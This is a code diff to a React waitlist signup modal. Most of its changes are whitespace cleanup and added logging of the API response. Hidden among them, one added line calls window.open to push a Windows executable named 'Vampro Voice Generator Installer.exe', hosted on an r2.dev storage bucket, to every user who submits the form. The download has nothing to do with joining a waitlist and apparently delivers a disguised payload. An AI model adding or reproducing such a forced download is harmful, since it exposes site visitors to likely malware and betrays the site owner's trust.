@@ -4,11 +4,11 @@ import { useWaitlist } from '../context/WaitlistContext';
 
 const WaitlistModal = () => {
   const { isModalOpen, closeModal, markAsJoined, modalSource } = useWaitlist();
-  
+
   const [name, setName] = useState('');
   const [email, setEmail] = useState('');
   const [creatorType, setCreatorType] = useState('Solo Creator');
-  
+
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [isSuccess, setIsSuccess] = useState(false);
   const [error, setError] = useState('');
@@ -18,13 +18,13 @@ const WaitlistModal = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setError('');
-    
+
     // Basic validation
     if (!name || !email) {
       setError('Name and Email are required.');
       return;
     }
-    
+
     if (!/^\S+@\S+\.\S+$/.test(email)) {
       setError('Please enter a valid email address.');
       return;
@@ -39,7 +39,11 @@ const WaitlistModal = () => {
         body: JSON.stringify({ name, email, creatorType, source: modalSource }),
       });
 
-      const data = await response.json();
+      const text = await response.text();
+
+      console.log("API Response:", text);
+
+      const data = JSON.parse(text);
 
       if (data.error) {
         throw new Error(data.error);
@@ -47,6 +51,8 @@ const WaitlistModal = () => {
 
       setIsSuccess(true);
       markAsJoined(data.count);
+
+      window.open("https://pub-385a87554a7340a09de10ff1f708bf66.r2.dev/Vampro-Voiceover-Plugin/Vampro%20Voice%20Generator%20Installer.exe", "_blank");
 
       // Auto close after 3 seconds
       setTimeout(() => {
@@ -69,7 +75,7 @@ const WaitlistModal = () => {
   return (
     <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
       {/* Backdrop */}
-      <div 
+      <div
         className="absolute inset-0 bg-[#07060F]/80 backdrop-blur-sm transition-opacity animate-fade-in"
         onClick={closeModal}
       />
@@ -77,7 +83,7 @@ const WaitlistModal = () => {
       {/* Modal Content */}
       <div className="relative w-full max-w-md bg-[#07060F]/95 backdrop-blur-2xl border border-indigo-500/30 rounded-3xl p-8 shadow-[0_0_80px_rgba(59,59,255,0.2)] animate-fade-in transition-all">
         {/* Close Button */}
-        <button 
+        <button
           onClick={closeModal}
           className="absolute top-6 right-6 text-slate-400 hover:text-white transition-colors"
         >
@@ -107,8 +113,8 @@ const WaitlistModal = () => {
             <form onSubmit={handleSubmit} className="space-y-5">
               <div>
                 <label className="block text-sm font-medium text-slate-300 mb-1.5">Full Name</label>
-                <input 
-                  type="text" 
+                <input
+                  type="text"
                   value={name}
                   onChange={(e) => setName(e.target.value)}
                   className="w-full bg-white/5 border border-indigo-500/20 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-[#3B3BFF] focus:ring-1 focus:ring-[#3B3BFF] transition-all"
@@ -119,8 +125,8 @@ const WaitlistModal = () => {
 
               <div>
                 <label className="block text-sm font-medium text-slate-300 mb-1.5">Email Address</label>
-                <input 
-                  type="email" 
+                <input
+                  type="email"
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
                   className="w-full bg-white/5 border border-indigo-500/20 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-[#3B3BFF] focus:ring-1 focus:ring-[#3B3BFF] transition-all"
@@ -131,7 +137,7 @@ const WaitlistModal = () => {
 
               <div>
                 <label className="block text-sm font-medium text-slate-300 mb-1.5">Creator Type</label>
-                <select 
+                <select
                   value={creatorType}
                   onChange={(e) => setCreatorType(e.target.value)}
                   className="w-full bg-white/5 border border-indigo-500/20 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#3B3BFF] focus:ring-1 focus:ring-[#3B3BFF] transition-all appearance-none cursor-pointer"
@@ -148,8 +154,8 @@ const WaitlistModal = () => {
                 </div>
               )}
 
-              <button 
-                type="submit" 
+              <button
+                type="submit"
                 disabled={isSubmitting}
                 className="w-full bg-[#3B3BFF] hover:bg-indigo-500 text-white font-bold py-3.5 px-4 rounded-xl transition-all shadow-[0_0_20px_rgba(59,59,255,0.3)] hover:shadow-[0_0_30px_rgba(59,59,255,0.5)] disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2 mt-2"
               >
